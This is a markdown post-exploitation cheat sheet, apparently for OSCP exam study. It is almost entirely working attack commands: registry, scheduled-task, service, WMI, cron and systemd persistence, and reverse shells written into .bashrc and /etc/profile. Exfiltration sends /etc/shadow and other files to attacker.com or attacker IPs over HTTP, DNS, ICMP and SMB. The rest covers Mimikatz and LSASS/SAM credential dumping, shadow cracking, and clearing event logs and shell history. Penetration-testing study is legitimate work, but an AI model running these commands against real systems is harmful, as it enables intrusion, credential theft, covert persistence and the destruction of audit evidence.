# Post-Exploitation Comprehensive Guide

## Table of Contents
1. [Persistence Mechanisms](#persistence-mechanisms)
2. [Data Exfiltration](#data-exfiltration)
3. [Credential Harvesting](#credential-harvesting)
4. [Covering Tracks](#covering-tracks)
5. [Internal Reconnaissance](#internal-reconnaissance)
6. [OSCP Post-Exploitation](#oscp-post-exploitation)

---

## Persistence Mechanisms

### Windows Persistence

#### Registry Run Keys
```cmd
# Run on login
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# Run once on next login
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# System-wide
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
```

#### Scheduled Tasks
```cmd
# Daily at 9 AM
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 09:00

# On logon
schtasks /create /tn "Update" /tr "powershell -enc <base64>" /sc onlogon

# Every 5 minutes
schtasks /create /tn "Check" /tr "C:\backdoor.exe" /sc minute /mo 5
```

#### Services
```cmd
# Create service
sc create "WindowsUpdate" binPath= "C:\backdoor.exe" start= auto
sc start "WindowsUpdate"

# PowerShell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\backdoor.exe" -StartupType Automatic
Start-Service "WindowsUpdate"
```

#### WMI Event Subscription
```powershell
# Create filter (every 60 seconds)
$FilterArgs = @{
    Name = 'PersistFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $FilterArgs

# Create consumer
$ConsumerArgs = @{
    Name = 'PersistConsumer'
    CommandLineTemplate = 'C:\Windows\Temp\backdoor.exe'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $ConsumerArgs

# Bind filter to consumer
$BindArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $BindArgs
```

### Linux Persistence

#### Cron Jobs
```bash
# User crontab
(crontab -l; echo "*/5 * * * * /tmp/.backdoor") | crontab -

# System-wide
echo "*/5 * * * * root /tmp/.backdoor" >> /etc/crontab
```

#### RC Scripts
```bash
# systemd
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Monitor

[Service]
ExecStart=/tmp/.backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor
systemctl start backdoor
```

#### SSH Keys
```bash
# Add attacker's public key
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

#### Bashrc/Profile
```bash
# Add to .bashrc
echo "bash -i >& /dev/tcp/10.10.14.5/443 0>&1 &" >> ~/.bashrc

# System-wide
echo "bash -i >& /dev/tcp/10.10.14.5/443 0>&1 &" >> /etc/profile
```

---

## Data Exfiltration

### File Transfer Methods

#### HTTP Exfiltration
```powershell
# PowerShell upload
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile "C:\sensitive\data.txt"

# curl (Windows)
curl -X POST -F "file=@C:\data.txt" http://attacker.com/upload

# Linux
curl -X POST -F "file=@/etc/shadow" http://attacker.com/upload
```

#### DNS Exfiltration
```bash
# Encode and send via DNS queries
cat /etc/passwd | base64 | while read line; do
    dig $line.attacker.com
done

# PowerShell
$data = Get-Content C:\sensitive.txt
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
nslookup $encoded.attacker.com
```

#### ICMP Exfiltration
```bash
# Linux (requires root)
xxd -p -c 16 /etc/passwd | while read line; do
    ping -c 1 -p $line attacker-ip
done

# Receive on attacker
sudo tcpdump -i eth0 icmp -X
```

#### SMB Exfiltration
```cmd
# Copy to attacker SMB share
copy C:\sensitive\data.txt \\attacker-ip\share\data.txt

# PowerShell
Copy-Item C:\data.txt -Destination \\attacker-ip\share\
```

---

## Credential Harvesting

### Windows Credentials

#### Mimikatz
```powershell
# Dump credentials
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Dump all
mimikatz # sekurlsa::logonpasswords full

# Export tickets
mimikatz # sekurlsa::tickets /export

# Golden ticket
mimikatz # lsadump::lsa /inject /name:krbtgt
```

#### LSASS Dump
```cmd
# Task Manager (GUI) → Find lsass.exe → Create dump file

# procdump
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full

# Parse on Kali
pypykatz lsa minidump lsass.dmp
```

#### SAM Dump
```cmd
reg save HKLM\SAM C:\sam.hive
reg save HKLM\SYSTEM C:\system.hive

# Extract on Kali
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### Linux Credentials

#### /etc/shadow
```bash
# Copy shadow file
cat /etc/shadow > /tmp/.shadow

# Unshadow for John
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### SSH Keys
```bash
# Find all SSH private keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find /home -name "*.pem" 2>/dev/null
```

#### Browser Passwords
```bash
# Firefox
~/.mozilla/firefox/*.default/logins.json
~/.mozilla/firefox/*.default/key4.db

# Chrome
~/.config/google-chrome/Default/Login Data
```

---

## Covering Tracks

### Windows

#### Clear Event Logs
```cmd
# Clear all event logs
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

# Clear specific log
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell
Clear-EventLog -LogName Application,System,Security
```

#### Clear Command History
```powershell
# PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Clear recent files
del %APPDATA%\Microsoft\Windows\Recent\*
```

#### Timestomp
```bash
# Modify file times (Metasploit)
meterpreter > timestomp C:\\file.exe -v
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Linux

#### Clear Logs
```bash
# Clear bash history
cat /dev/null > ~/.bash_history
history -c

# Clear system logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Selective deletion
sed -i '/10.10.14.5/d' /var/log/auth.log
```

#### Modify Timestamps
```bash
# Touch to match another file
touch -r /etc/passwd backdoor.sh

# Set specific time
touch -t 202301011200 backdoor.sh
```

---

## Internal Reconnaissance

### Network Mapping

#### Windows
```cmd
# ARP table
arp -a

# Routing table
route print
netstat -rn

# Network interfaces
ipconfig /all

# Connections
netstat -ano
```

#### Linux
```bash
# Network config
ip a
ifconfig

# Routes
ip route
route -n

# ARP
ip neigh
arp -a

# Connections
netstat -tulpn
ss -tulpn
```

### Host Discovery

#### Ping Sweep
```bash
# Windows
for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.1.%i | find "Reply" >> alive.txt

# PowerShell
1..254 | %{"192.168.1.$_"} | %{if (Test-Connection $_ -Count 1 -Quiet) {$_}}

# Linux
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" &; done
```

#### Port Scanning (No Nmap)
```bash
# Bash TCP scan
for port in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/target/$port" 2>/dev/null && echo "Port $port open"
done

# PowerShell
1..1024 | %{Test-NetConnection -Port $_ -ComputerName target -InformationLevel Quiet}
```

### Service Enumeration

#### Windows Services
```cmd
# List services
sc query
Get-Service

# Installed software
wmic product get name,version
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
```

#### Shares
```cmd
# List shares
net share
net view \\computername

# Access shares
dir \\target\c$
```

---

## OSCP Post-Exploitation

### Workflow

#### 1. Stabilize Shell
```bash
# Upgrade shell
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```

#### 2. Situational Awareness
```bash
# System info
whoami
hostname
uname -a / systeminfo

# Network
ip a / ipconfig
ip route / route print

# Users
cat /etc/passwd / net user
```

#### 3. Credential Harvest
```bash
# Windows
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Linux
cat /etc/shadow
find / -name id_rsa 2>/dev/null
```

#### 4. Persistence (if allowed)
```bash
# Add SSH key / Registry run key
# Document for report!
```

#### 5. Pivot Preparation
```bash
# Upload pivot tools (chisel, ligolo)
# Map internal networks
# Identify next targets
```

#### 6. Proof Collection
```bash
# proof.txt screenshot
type C:\Users\Administrator\Desktop\proof.txt
cat /root/proof.txt

# IP address proof
ipconfig / ip a

# Screenshot everything!
```

---

## OSCP Exam Tips

1. **Document everything** - screenshots, commands, timestamps
2. **Don't waste time on persistence** unless specifically required
3. **Collect credentials immediately** - SAM, shadow, LSASS
4. **Map network early** - identify pivot opportunities
5. **Screenshot proof.txt** with IP/hostname visible
6. **Transfer loot to Kali** for analysis
7. **Keep good notes** - you'll need them for report
8. **Don't delete logs** - exam environment, no need
9. **Stabilize shells** - makes everything easier
10. **Enumerate thoroughly** - missed creds = missed privesc

---

## Quick Reference

### Windows Credentials
```cmd
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
impacket-secretsdump -sam sam -system system LOCAL
```

### Linux Credentials
```bash
cat /etc/shadow
unshadow passwd shadow > hashes.txt
john hashes.txt
```

### Persistence
```cmd
# Windows
reg add HKCU\...\Run /v Backdoor /d "C:\backdoor.exe"

# Linux
(crontab -l; echo "*/5 * * * * /tmp/.backdoor") | crontab -
```

### Exfiltration
```bash
# HTTP
curl -X POST -F "file=@data.txt" http://attacker/upload

# SMB
copy data.txt \\attacker\share\
```

---

**Remember**: Post-exploitation is about persistence, pivoting, and proof collection. In OSCP, focus on proof collection and pivoting!
